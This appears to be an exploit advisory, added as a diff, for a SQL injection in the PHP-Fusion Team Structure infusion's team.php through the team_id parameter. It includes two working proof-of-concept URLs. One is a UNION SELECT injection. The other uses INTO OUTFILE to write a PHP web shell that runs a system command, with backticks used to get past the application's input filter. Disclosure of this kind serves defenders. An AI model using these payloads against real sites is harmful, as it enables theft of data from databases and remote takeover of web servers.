@@ -1,0 +1,43 @@
+# Exploit Title: PHP-fusion Team Structure Infusion (All versions) SQL
+injection
+# Date: 16-1-2010
+# Author: Saif El-Sherei
+# Software Link:
+http://www.php-fusion.co.uk/infusions/addondb/view.php?addon_id=120
+# Version: PHP-fusion (7.01..03), TeamStructure Infusion(all versions)
+# Tested on: Firefox 3.0.15, , IE 8
+
+Info:
+
+Plugin that allows the site to have a list of all teams / clubs (eg football
+or hockey) with the playing staff, displaying the standings with the
+position of command or a list of the best strikers of a championship.
+
+Details:
+
+the "team_id" variable is not probably sanitized before using in SQL query
+in "team.php", the attack can be elevated as shown in second POC to bypass
+PHP-Fusion's GET variable XSS filter. by using back-ticks instead of
+brackets used in any php function  in that case shell_exec().
+
+Condition:
+
+magic_quotes_gpc = Off
+
+POC:
+
+
+http://127.0.0.1/php-fusion/files/infusions/teams_structure/team.php?team_id=-1'
+union select
+'1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17
+
+http://127.0.0.1/php-fusion/files/infusions/teams_structure/team.php?team_id=-1'
+union select '1','2','<?php $out=`id`;echo $out;
+?>','4','5','6','7','8','9','10','11','12','13','14','15','16','17' into
+outfile '/var/www/php-fusion/files/images/test.php
+
+Regards,
+
+Saif El-Sherei
+
+OSCP
